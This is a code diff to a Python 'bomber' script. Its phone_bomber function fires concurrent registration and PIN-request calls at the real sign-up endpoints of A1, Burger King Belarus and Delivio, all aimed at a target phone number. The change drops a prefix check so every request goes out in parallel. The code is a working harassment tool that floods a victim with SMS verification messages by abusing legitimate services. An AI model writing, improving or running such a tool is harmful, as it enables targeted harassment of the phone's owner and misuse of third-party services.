@@ -67,36 +67,33 @@ async def email_bomber(email):
 async def phone_bomber(phone):
     loop = asyncio.get_event_loop()
     print(colored("Started A1", "blue"))
-    if phone[3:5] in ('29', '44'):
-        phone_a1 = parse_phone_a1(phone)
-        try:
-            feature_a1 = loop.run_in_executor(None, lambda: requests.request("GET",
-                                                                             url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone_a1}&timer=0',
-                                                                             headers=a1_headers, data={}))
-            response_a1 = await feature_a1
-            output_status(response_a1, "A1")
-        except Exception as e:
-            print(colored(e, "green"))
-    else:
-        print(colored("A1 skipped", "blue"))
+    phone_a1 = parse_phone_a1(phone)
+    feature_a1 = loop.run_in_executor(None, lambda: requests.request("GET",
+                                                                     url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone_a1}&timer=0',
+                                                                     headers=a1_headers, data={}))
     print(colored("Started Burger King", "blue"))
     payload_bk = make_bk_payload(phone)
+    feature_bk = loop.run_in_executor(None,
+                                      lambda: requests.request("POST",
+                                                               url='https://burger-king.by/local/ajax/auth.php',
+                                                               headers=burger_headers, data=payload_bk))
+    print(colored("Started Dilivio", "blue"))
+    payload_delivio = "{{\"phone\":\"+{0}\"}}".format(phone.replace('+', ''))
+    feature_delivio = loop.run_in_executor(None,
+                                           lambda: requests.request("POST",
+                                                                    url='https://delivio.by/be/api/register',
+                                                                    headers=delivio_headers, data=payload_delivio))
     try:
-        feature_bk = loop.run_in_executor(None,
-                                          lambda: requests.request("POST",
-                                                                   url='https://burger-king.by/local/ajax/auth.php',
-                                                                   headers=burger_headers, data=payload_bk))
+        response_a1 = await feature_a1
+        output_status(response_a1, "A1")
+    except Exception as e:
+        print(colored(e, "green"))
+    try:
         response_bk = await feature_bk
         output_status(response_bk, "Burger King")
     except Exception as e:
         print(colored(e, "green"))
-    print(colored("Started Dilivio", "blue"))
-    payload_delivio = "{{\"phone\":\"+{0}\"}}".format(phone.replace('+', ''))
     try:
-        feature_delivio = loop.run_in_executor(None,
-                                               lambda: requests.request("POST",
-                                                                        url='https://delivio.by/be/api/register',
-                                                                        headers=delivio_headers, data=payload_delivio))
         response_delivio = await feature_delivio
         output_status(response_delivio, "Delivio")
     except Exception as e:
